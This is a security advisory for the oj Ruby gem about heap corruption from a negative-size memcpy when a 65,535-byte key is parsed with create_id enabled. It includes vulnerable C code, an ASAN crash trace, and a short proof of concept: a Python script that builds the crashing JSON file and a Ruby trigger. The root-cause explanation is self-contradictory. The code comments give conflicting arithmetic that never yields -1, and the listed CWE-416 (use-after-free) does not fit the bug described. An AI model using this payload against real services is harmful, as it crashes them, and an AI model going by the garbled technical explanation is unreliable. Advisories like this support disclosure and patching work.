# [H] Oj: Negative-Size memcpy in Oj::Parser create_id Attribute Handling

## Summary
Severity: High
Advisory: GHSA-9cv6-qcjw-4grx
CVE: CVE-2026-54900
CWE: CWE-416
Ecosystem: RubyGems
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-9cv6-qcjw-4grx
Type: github-advisory

## Affected
- RubyGems: `oj` — affected >=0 <3.17.3

## Details
### Summary

`Oj::Parser#parse` in usual mode with `create_id` enabled is vulnerable to heap corruption via a negative-size `memcpy`. When a JSON object key is exactly 65,535 bytes long, an integer truncation in `form_attr` (`usual.c:63`) converts the length to `-1` before passing it to `memcpy`. This causes `memcpy` to copy `SIZE_MAX` bytes (interpreted as a huge `size_t`), corrupting heap memory and crashing the process.

### Version

- **Software**: oj gem
- **Affected**: all versions with `ext/oj/usual.c`
- **Latest tested**: 3.17.1 (confirmed present)

### Details

`ext/oj/usual.c`, `form_attr`:

```c
// usual.c:55–64
static ID form_attr(const char *str, size_t slen) {
    char        buf[4096];
    // ...
    int  blen = (int)slen + 1;    // ← truncates: 65535 + 1 = 65536 → wraps to 0
                                  //   or: 65535 cast to int = 65535 (fits),
                                  //   but blen = 65536 → INT overflow on +1 if slen=INT_MAX
    // ...
    memcpy(buf, "@", 1);
    memcpy(buf + 1, str, (size_t)blen);  // ← size_t(-1) = SIZE_MAX
}
```

The cache (`cache_intern`) uses a fixed 65,536-byte slab. When `slen = 65535`, the arithmetic wraps and `memcpy` is called with `(size_t)-1`.

ASAN report:
```
==80452==ERROR: AddressSanitizer: negative-size-param: (size=-1)
    #0 memcpy
    #1 form_attr          /ext/oj/usual.c:63
    #2 cache_intern       /ext/oj/cache.c:326
    #3 get_attr_id        /ext/oj/usual.c:186
    #4 close_object_create  /ext/oj/usual.c:374
    #5 parse              /ext/oj/parser.c:693
    #6 parser_parse       /ext/oj/parser.c:1408
0x531000528800 is located 0 bytes inside of 65536-byte region [0x531000528800, 0x531000538800)
```

### Reproduce

Generate the payload:

```python
key = 'A' * 65535
with open('poc.json', 'w') as f:
    f.write('{"json_class":"Oj::Bag","' + key + '":1}')
```

Trigger:

```ruby
require 'oj'
Oj::Parser.new(:usual, create_id: 'json_class').parse(STDIN.read)
```

## References
- https://github.com/ohler55/oj/security/advisories/GHSA-9cv6-qcjw-4grx
- https://github.com/ohler55/oj
